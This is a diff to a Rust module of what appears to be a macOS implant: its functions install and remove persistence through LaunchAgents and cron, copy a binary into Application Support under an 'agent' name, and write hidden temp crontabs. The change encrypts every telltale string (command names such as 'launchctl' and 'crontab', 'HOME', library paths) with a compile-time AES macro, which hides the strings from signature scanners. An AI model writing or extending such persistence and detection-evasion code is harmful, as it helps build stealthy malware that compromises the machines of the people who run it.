@@ -17,17 +17,19 @@
 use std::fs;
 use std::path::PathBuf;
 use std::process::Command;
+use crate::strcrypt_rt;
+use strcrypt::aes_str;
 
 // ── Helpers ───────────────────────────────────────────────────────────
 
 fn home_dir() -> Result<PathBuf, String> {
-    std::env::var("HOME")
+    std::env::var(aes_str!("HOME"))
         .map(PathBuf::from)
-        .map_err(|_| "HOME not set".to_string())
+        .map_err(|_| aes_str!("HOME not set"))
 }
 
 fn launch_agents_dir() -> Result<PathBuf, String> {
-    Ok(home_dir()?.join("Library").join("LaunchAgents"))
+    Ok(home_dir()?.join(aes_str!("Library")).join(aes_str!("LaunchAgents")))
 }
 
 fn plist_path(label: &str) -> Result<PathBuf, String> {
@@ -42,8 +44,8 @@ fn plist_path(label: &str) -> Result<PathBuf, String> {
 
 fn stable_drop(source: &str, name: &str) -> Result<String, String> {
     let support_dir = home_dir()?
-        .join("Library")
-        .join("Application Support")
+        .join(aes_str!("Library"))
+        .join(aes_str!("Application Support"))
         .join(name);
     std::fs::create_dir_all(&support_dir)
         .map_err(|e| format!("mkdir Application Support/{name}: {e}"))?;
@@ -142,8 +144,8 @@ pub fn remove_launchagent(label: &str) -> Result<String, String> {
     }
 
     // Unload first (best-effort - ignore error if not loaded)
-    let _ = Command::new("launchctl")
-        .args(["unload", &path.to_string_lossy()])
+    let _ = Command::new(aes_str!("launchctl"))
+        .args([aes_str!("unload"), path.to_string_lossy().into_owned()])
         .output();
 
     fs::remove_file(&path)
@@ -158,10 +160,10 @@ pub fn install_cron(binary_path: &str) -> Result<String, String> {
     let name = std::path::Path::new(binary_path)
         .file_name()
         .map(|n| n.to_string_lossy().into_owned())
-        .unwrap_or_else(|| "agent".to_string());
+        .unwrap_or_else(|| aes_str!("agent"));
     let stable = stable_drop(binary_path, &name)?;
 
-    let current = Command::new("crontab")
+    let current = Command::new(aes_str!("crontab"))
         .arg("-l")
         .output()
         .map_err(|e| format!("crontab -l: {e}"))?;
@@ -181,7 +183,7 @@ pub fn install_cron(binary_path: &str) -> Result<String, String> {
     let tmp = format!("/tmp/.cron_{}", std::process::id());
     fs::write(&tmp, &new_content).map_err(|e| format!("Write temp crontab: {e}"))?;
 
-    let rc = Command::new("crontab")
+    let rc = Command::new(aes_str!("crontab"))
         .arg(&tmp)
         .status()
         .map_err(|e| format!("crontab <tmp>: {e}"))?;
@@ -199,7 +201,7 @@ pub fn install_cron(binary_path: &str) -> Result<String, String> {
 }
 
 pub fn remove_cron(binary_path: &str) -> Result<String, String> {
-    let current = Command::new("crontab")
+    let current = Command::new(aes_str!("crontab"))
         .arg("-l")
         .output()
         .map_err(|e| format!("crontab -l: {e}"))?;
@@ -218,7 +220,7 @@ pub fn remove_cron(binary_path: &str) -> Result<String, String> {
     let tmp = format!("/tmp/.cron_{}", std::process::id());
     fs::write(&tmp, &filtered).map_err(|e| format!("Write temp crontab: {e}"))?;
 
-    let rc = Command::new("crontab")
+    let rc = Command::new(aes_str!("crontab"))
         .arg(&tmp)
         .status()
         .map_err(|e| format!("crontab reload: {e}"))?;
@@ -256,7 +258,7 @@ pub fn list() -> String {
 
     // Crontab
     out.push("\n=== Crontab ===".to_string());
-    match Command::new("crontab").arg("-l").output() {
+    match Command::new(aes_str!("crontab")).arg("-l").output() {
         Ok(o) if o.status.success() => {
             let text = String::from_utf8_lossy(&o.stdout);
             let entries: Vec<_> = text
